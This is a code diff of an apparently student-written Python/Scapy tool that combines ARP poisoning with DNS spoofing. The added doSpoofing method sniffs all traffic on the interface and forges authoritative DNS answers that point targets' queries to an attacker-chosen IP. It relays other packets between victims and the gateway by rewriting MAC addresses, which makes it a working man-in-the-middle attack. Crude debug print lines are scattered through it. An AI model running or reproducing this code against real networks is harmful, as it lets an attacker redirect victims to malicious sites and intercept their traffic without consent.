@@ -30,7 +30,6 @@ class dnsfinal():
         input = raw_input("Enter the index of the IP of the default gateway: ")
         inputInt = int(input)
         self.defaultGateway.append({"ip": self.ips_used[inputInt][1][ARP].psrc, "mac": self.ips_used[inputInt][1][ARP].hwsrc})
-        print(self.defaultGateway)
 
 
         self.target = []
@@ -48,7 +47,6 @@ class dnsfinal():
         else:
             for packet_sent, packet_received in self.ips_used:
                 self.target.append({"ip": packet_received[ARP].psrc, "mac": packet_received[ARP].hwsrc})
-        print(self.target)
 
 
         #ip of the website to which the user should be rerouted
@@ -69,8 +67,7 @@ class dnsfinal():
 
     def startProcess(self):
         arpprocess = arp(self.interface)
-        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y")
-        #arpprocess.startProcess()
+        arpprocess.setInput(self.ip_range, self.ips_used, self.defaultGateway, self.target, self.ownMAC, "y", "loud")
         proc_thread = None
         proc_thread = threading.Thread(target=arpprocess.startProcess)
         proc_thread.daemon = True
@@ -78,34 +75,75 @@ class dnsfinal():
 
         print("DNS sniffing has started")
         while True:
-            sniff(filter="port 53", prn=lambda packet: self.doSpoofing(packet), iface=self.interface)
+            sniff(store=0, prn=lambda packet: self.doSpoofing(packet), iface=self.interface)
 
     #method which does the DNS spoofing of a packet
     def doSpoofing(self, packet):
-        if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
-            #Case the user entered specific websites to spoof
+        #checks whether it is a correct packet
+        if packet.haslayer(Ether) and packet.haslayer(IP):
+            try:
+                #checks whether it is a DNS packet
+                if (packet.haslayer(DNS)) and (packet[DNS].qr == 0):
+                    #CASE WHERE THE PACKET COMES FROM GATEWAY AND THUS SHOULD BE FORWARDED TO TARGET2                
+                    if(self.defaultGateway[0]["mac"] == packet[Ether].src):
+                        receiver = None
+                        for tar1 in self.target:
+                            if(tar1["ip"] == packet[IP].dst):
+                                receiver = tar1
+                                packet[Ether].src = self.ownMAC
+                                packet[Ether].dst = receiver["mac"]
+                                if(packet.haslayer(DNS)):
+                                    print("BALLS WEAK ARM SWAETY 1")
+                                sendp(packet, iface=self.interface)
+                    #Case where packet does not come from gateway
+                    else:
+                        #check whether source is on the list of targets to spoof
+                        for tar1 in self.target:
+                            if tar1["mac"] == packet[Ether].src:
+                                #Case the user entered specific websites to spoof
+                                should_be_spoofed = False
+                                if(len(self.url) > 0):
+                                    for domain in self.url:
+                                        if(domain in packet[DNS].qd.qname):
+                                            should_be_spoofed = True
+                                        
+                                #Case all URLs should be spoofed or it was in the list of URLs to spoof
+                                if(len(self.url) == 0 or should_be_spoofed):
+                                    #create fake response packet
+                                    spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
+                                    spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
+                                    spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
+                                    spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=self.ip_website)
+                                    spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
+                                    #send the packet
+                                    print("SPOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOFED")
+                                    sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface)
+                                    print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website))
+                                #Packet was not supposed to be spoofed
+                                else:
+                                    packet[Ether].src = self.ownMAC
+                                    packet[Ether].dst = self.defaultGateway[0]["mac"]
+                                    if(packet.haslayer(DNS)):
+                                        print("BALLS WEAK ARM SWAETY 2")
+                                    sendp(packet, iface=self.interface)                        
+                else:
+                    if(packet[Ether].src == self.defaultGateway[0]["mac"]):
+                        packet[Ether].src = packet[Ether].dst
+                        for tar in self.target:
+                            if tar["ip"] == packet[IP].dst:
+                                packet[Ether].dst = tar["mac"]
+                        #print("from: {}, {} . to: {}, {} .".format(packet[IP].src, packet[Ether].src, packet[IP].dst, packet[Ether].dst))
+                        sendp(packet, iface=self.interface)
+                    else:
+                        for tar in self.target:
+                            if tar["mac"] == packet[Ether].src:
+                                packet[Ether].src = self.ownMAC
+                                packet[Ether].dst = self.defaultGateway[0]["mac"]
+                                sendp(packet, iface=self.interface)
+            except:
+                print("OOPSIE DOOPSIE")
+                
             
-            should_be_spoofed = False
-            if(len(self.url) > 0):
-                for domain in self.url:
-                    if(domain in packet[DNS].qd.qname):
-                        should_be_spoofed = True
-                    
-            #Case all URLs should be spoofed or it was in the list of URLs to spoof
-            if(len(self.url) == 0 or should_be_spoofed):
-                #create fake response packet
-                spoofedETHER = Ether(src=packet[Ether].dst, dst=packet[Ether].src)
-                spoofedIP = IP(src=packet[IP].dst, dst=packet[IP].src)
-                spoofedUDP = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
-                spoofedDNSRR = DNSRR(rrname=packet[DNS].qd.qname, rdata=self.ip_website)
-                spoofedDNS = DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=spoofedDNSRR)
-                #send the packet
-                sendp(spoofedETHER/spoofedIP/spoofedUDP/spoofedDNS, iface=self.interface)
-                print("we spoofed IP: {}, Query: {}, response: {}".format(packet[IP].src, packet[DNS].qd.qname, self.ip_website))
-            #TODO REDIRECT PACKETS TO DNS SERVER
-            else:
+
+                
             
-        #TODO REDIRECT       
-        else:
-            print(self.defaultGateway)
-        
